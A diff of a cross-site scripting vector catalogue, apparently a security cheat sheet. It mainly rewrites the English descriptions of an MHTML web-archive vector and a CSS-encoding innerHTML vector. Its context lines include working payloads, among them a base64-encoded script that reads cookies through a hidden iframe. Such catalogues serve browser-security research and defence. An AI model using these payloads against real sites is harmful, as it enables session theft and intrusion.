@@ -994,7 +994,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'internet explorer': ['6.0', '7.0', '8.0', '9.0'],
+            'internet explorer': ['6.0'],
             'opera': ['8.x', '9.x', '10.x', 'mobile'] 
         },
         'tags'       : ['xss', 'javascript', 'background', 'classic', 'html', 'table'],
@@ -3013,7 +3013,7 @@ var items =
             'raw'           : '<html>\n<body>\n<b>some content without two new line \\n\\n</b>\nContent-Type: multipart/related; boundary="******"<b>some content without two new line</b>\n--******\nContent-Location: xss.html\nContent-Transfer-Encoding: base64\n\nPGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1\ncmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9\ndXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy\nYW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg\n--\n</body>\n</html>'
         },
         'description': {
-	    'en' : 'Any format, including images (remains valid, since it allows text sectors), may be considered as web-archive, if the user input is allowed before the first two new lines. By this vector are vulnerable all sites that do not contain two new lines in the source code and allows users to insert new line, as well as all sites that allows users to upload inconvertible images etc. A link to the web-archive can be specified in the tag <IFRAME> or via location or via anything else.',
+	    'en' : 'Any content including images (for example GIF comments) may be considered as web-archive in case user input is allowed before the first two new lines. Using this vector all sites that do not contain two new lines in the source code and allows users to insert new line are vulnerable - as well as all sites that allow users to upload images without post-upload conversion etc. A link to this web-archives can be specified via <IFRAME> or location.href and comparable.',
             'ja' : '',
             'ru' : 'Любой формат, включая изображения (остаются неиспорченными, поскольку содержат текстовые секторы), может рассматриваться в качестве веб-архива, если пользователь имеет возможность влиять на исходный код сайта до первой пустой строки, или первых двух переводов строк. Этим вектором уязвимы все сайты, которые не содержат пробелов в исходном коде и позволяют пользователю вставлять новые строки, а также все сайты, которые позволяют пользователям загружать неконвертируемые изображения и т.п. Ссылка на архив может быть указана в теге <IFRAME> или с помощью location, или как-либо ещё.',
             'de' : ''
@@ -3075,7 +3075,7 @@ var items =
         },
         'data'       : '<div id=d><div style="font-family:\'sans\\27\\3B color\\3Ared\\3B\'">X</div></div>\n<script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
         'description': {
-	    'en' : 'The example shows how Internet Explorer and Mozilla Firefox automaticaly decode CSS-encoding if the harmless markup is copied using innerHTML.',
+	    'en' : 'The example shows that Internet Explorer and Mozilla Firefox automaticaly decode CSS-encoding if the harmless markup is copied using innerHTML.',
             'ja' : '',
             'ru' : 'Пример показывает, как Internet Explorer and Mozilla Firefox автоматически декодируют CSS-кодировку в случае, если на первый взгляд безопасная разметка копируется с помощью innerHTML.',
             'de' : ''
